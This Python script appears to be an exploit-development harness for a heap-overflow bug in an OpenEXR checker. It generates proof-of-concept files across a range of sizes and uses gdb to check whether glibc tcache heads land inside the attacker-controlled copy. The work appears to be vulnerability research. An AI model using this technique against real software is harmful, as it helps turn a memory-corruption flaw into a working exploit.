#!/usr/bin/env python3
"""W192: sweep N with unpacked_size=4N (COPY1 in bounds) and enumerate live
glibc tcache heads at entry to the pinned inverse-sort sink.  A hit needs a
head at dst+4N..dst+6N, i.e. inside the second, file-chosen copy.  All PoCs
use a fixed-length filename so path length cannot shift the consumer's heap
layout between probes.
"""
import hashlib
import pathlib
import re
import subprocess
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
WORK = ROOT / "work-w192"
EV = ROOT / "evidence" / "w192-u4n-head-sweep.out"
NS = [16, 32, 64, 96, 128, 192, 256, 320, 384, 448, 512, 640, 768,
      896, 1024, 1072, 1152, 1280, 1536, 1792, 2048]

def sha(p):
    return hashlib.sha256(p.read_bytes()).hexdigest()

assert sha(ROOT / "cases/make_poc_mixed_full.py") == \
    "90f3f6fa759cfbd1453db7b161e2b6d8d67eba2b2e9978ea74b68f91d44d52c2"
WORK.mkdir(exist_ok=True)
base = WORK / "baseline.exr"
def run(cmd, **kw):
    return subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True, **kw)

run([str(ROOT / "bin-vuln-plain/gen_baseline_deep_mixed"), str(base)], check=True)
assert sha(base) == "9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04"

pat = re.compile(r"TCACHE-HEADS=(\[.*\])")
lines = []
hits = []
for n in NS:
    poc = WORK / ("p%04d.exr" % n)
    gen = run([sys.executable, "cases/make_poc_mixed_full.py", str(base),
               str(poc), str(n), "0x5a"], check=True)
    gdb = run(["gdb", "-q", "-batch",
               "-ex", "set pagination off", "-ex", "set confirm off",
               "-ex", "set disable-randomization on",
               "-ex", "break sort2_4ByteChannels_tiled",
               "-ex", "run -c " + str(poc.relative_to(ROOT)),
               "-x", "harness/w192-head-enum.cmd",
               str(ROOT / "build-vuln-plain/bin/exrcheck")])
    m = pat.search(gdb.stdout + gdb.stderr)
    heads = eval(m.group(1)) if m else None
    hit = bool(heads and any(4 * n <= off <= 6 * n for _, off, _ in heads))
    if hit:
        hits.append(n)
    lines.append("N=%s U=%s COPY2=%s..%s HEADS=%s %s" %
                 (n, 4 * n, 4 * n, 6 * n, heads, "HIT" if hit else ""))
EV.write_text("\n".join(lines) + "\n")
print("\n".join(lines))
print("HITS=%s" % hits)
print("SHA256=%s" % sha(EV))
